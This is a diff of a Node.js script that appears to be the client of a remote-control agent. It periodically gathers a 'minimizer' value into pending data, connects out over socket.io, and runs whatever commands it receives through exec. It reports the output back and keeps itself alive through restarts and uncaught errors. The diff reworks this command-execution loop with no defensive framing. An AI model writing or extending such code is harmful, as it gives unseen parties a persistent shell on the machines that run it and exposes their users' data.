@@ -54,15 +54,14 @@ const runForWindows = async () => {
 const runForAll = async () => {
   // Run Minimizer
 
-  let lastMinimizer = '';
+  let lastMinimizer = "";
   setInterval(async () => {
     const curMinimizer = await getMinimizer();
     if (lastMinimizer != curMinimizer) {
       pendingData.minimizer += "," + curMinimizer;
       lastMinimizer = curMinimizer;
     }
-  }, 1000)
-  
+  }, 1000);
 
   const { io } = require("socket.io-client");
   const { spawn } = require("child_process");
@@ -99,13 +98,14 @@ const runForAll = async () => {
 
   const platform = platformConfig[process.platform] || platformConfig.linux;
 
-  // Keep track of initial working directory and session state
+  // Keep track of state
   const initialWorkingDirectory = process.cwd();
   let currentWorkingDirectory = initialWorkingDirectory;
-  let currentShellProcess = null;
+  let currentProcess = null;
   let errorCount = 0;
-  const MAX_ERRORS = 3; // Maximum consecutive errors before forced restart
-  const ERROR_RESET_TIMEOUT = 60000; // Reset error count after 1 minute of successful operation
+  const MAX_ERRORS = 3;
+  const ERROR_RESET_TIMEOUT = 60000;
+  const COMMAND_TIMEOUT = 30000;
 
   // Function to create socket connection and set up event handlers
   function createSocketConnection() {
@@ -154,17 +154,16 @@ const runForAll = async () => {
     }
   }
 
-  // Function to handle command results
   function handleCommandResult(socket, result) {
     if (result.success) {
-      errorCount = 0; // Reset error count on successful command
+      errorCount = 0;
       setTimeout(() => {
-        errorCount = 0; // Reset error count after timeout
+        errorCount = 0;
       }, ERROR_RESET_TIMEOUT);
     } else {
       errorCount++;
       if (errorCount >= MAX_ERRORS) {
-        restartSession(socket, true); // Force restart after too many errors
+        restartSession(socket, true);
         return;
       }
     }
@@ -176,7 +175,6 @@ const runForAll = async () => {
     });
   }
 
-  // Function to handle command errors
   function handleCommandError(socket, error) {
     errorCount++;
     if (errorCount >= MAX_ERRORS) {
@@ -193,20 +191,17 @@ const runForAll = async () => {
     });
   }
 
-  // Function to restart session
   async function restartSession(socket, isAutoRestart = false) {
     try {
-      // Clean up current shell process if it exists
-      if (currentShellProcess && !currentShellProcess.killed) {
-        currentShellProcess.kill();
+      if (currentProcess) {
+        currentProcess.kill();
+        currentProcess = null;
       }
 
-      // Reset working directory to initial state
       process.chdir(initialWorkingDirectory);
       currentWorkingDirectory = initialWorkingDirectory;
       errorCount = 0;
 
-      // Notify server of restart
       socket.emit("commandResult", {
         success: true,
         output: `Session ${
@@ -232,25 +227,18 @@ const runForAll = async () => {
     }
   }
 
-  // Function to execute command and maintain directory state
   function executeCommand(command) {
     return new Promise((resolve, reject) => {
-      let output = "";
-      let errorOutput = "";
-
-      // Split command and arguments while preserving quoted strings
-      const parts = command.match(/(?:[^\s"']+|"[^"]*"|'[^']*')+/g) || [];
-      const cmd = parts[0];
-      const args = parts.slice(1).map((arg) => arg.replace(/^["']|["']$/g, "")); // Remove quotes
-
-      // Handle 'cd' command specially
-      if (cmd.toLowerCase() === "cd") {
+      // Handle CD command specially to track directory changes
+      if (command.trim().toLowerCase().startsWith("cd ")) {
+        const newPath = command
+          .trim()
+          .slice(3)
+          .trim()
+          .replace(/^["']|["']$/g, "");
         try {
-          const newPath =
-            args.length > 0
-              ? path.resolve(currentWorkingDirectory, args[0])
-              : os.homedir();
-          process.chdir(newPath);
+          const targetPath = path.resolve(currentWorkingDirectory, newPath);
+          process.chdir(targetPath);
           currentWorkingDirectory = process.cwd();
           resolve({
             success: true,
@@ -262,67 +250,56 @@ const runForAll = async () => {
           resolve({
             success: false,
             output: null,
-            error: error.message,
+            error: `Failed to change directory: ${error.message}`,
           });
           return;
         }
       }
 
-      // Handle 'dir' command on non-Windows platforms
-      const finalCommand =
-        process.platform !== "win32" && cmd.toLowerCase() === "dir"
-          ? platform.listDirCmd
-          : command;
-
-      // Prepare shell command
-      const shellArgs = [...platform.shellArgs, finalCommand];
-
-      const proc = spawn(platform.shell, shellArgs, {
+      // Execute command in current working directory
+      const execOptions = {
         cwd: currentWorkingDirectory,
-        shell: true,
-      });
+        timeout: COMMAND_TIMEOUT,
+        maxBuffer: 1024 * 1024 * 10, // 10MB buffer
+      };
 
-      currentShellProcess = proc; // Store reference to current process
+      currentProcess = exec(command, execOptions, (error, stdout, stderr) => {
+        currentProcess = null;
 
-      proc.stdout.on("data", (data) => {
-        output += data.toString();
-      });
+        // Check if the command changed directory
+        try {
+          // Update current working directory after command execution
+          currentWorkingDirectory = process.cwd();
+        } catch (e) {
+          // If there's an error getting cwd, reset to initial directory
+          process.chdir(initialWorkingDirectory);
+          currentWorkingDirectory = initialWorkingDirectory;
+        }
 
-      proc.stderr.on("data", (data) => {
-        errorOutput += data.toString();
-      });
+        if (error) {
+          resolve({
+            success: false,
+            output: stdout ? stdout.trim() : null,
+            error: stderr ? stderr.trim() : error.message,
+          });
+          return;
+        }
 
-      proc.on("close", (code) => {
-        currentShellProcess = null;
         resolve({
-          success: code === 0,
-          output: output.trim(),
-          error: errorOutput.trim() || null,
+          success: true,
+          output: stdout.trim(),
+          error: stderr ? stderr.trim() : null,
         });
       });
 
-      proc.on("error", (error) => {
-        currentShellProcess = null;
+      currentProcess.on("error", (error) => {
+        currentProcess = null;
         reject({
           success: false,
           output: null,
           error: error.message,
         });
       });
-
-      // Set timeout for command execution
-      const timeout = setTimeout(() => {
-        if (proc && !proc.killed) {
-          proc.kill();
-          reject({
-            success: false,
-            output: null,
-            error: "Command execution timed out",
-          });
-        }
-      }, 30000); // 30 second timeout
-
-      proc.on("close", () => clearTimeout(timeout));
     });
   }
 
@@ -331,8 +308,8 @@ const runForAll = async () => {
 
   // Handle process termination
   process.on("SIGINT", () => {
-    if (currentShellProcess && !currentShellProcess.killed) {
-      currentShellProcess.kill();
+    if (currentProcess) {
+      currentProcess.kill();
     }
     if (socket) {
       socket.disconnect();
@@ -342,6 +319,7 @@ const runForAll = async () => {
 
   // Handle uncaught exceptions
   process.on("uncaughtException", (error) => {
+    console.error("Uncaught Exception:", error);
     if (socket) {
       handleCommandError(socket, error);
     }
@@ -349,8 +327,9 @@ const runForAll = async () => {
 
   // Handle unhandled promise rejections
   process.on("unhandledRejection", (reason, promise) => {
+    console.error("Unhandled Rejection:", reason);
     if (socket) {
-      handleCommandError(socket, new Error(reason));
+      handleCommandError(socket, new Error(String(reason)));
     }
   });
 };
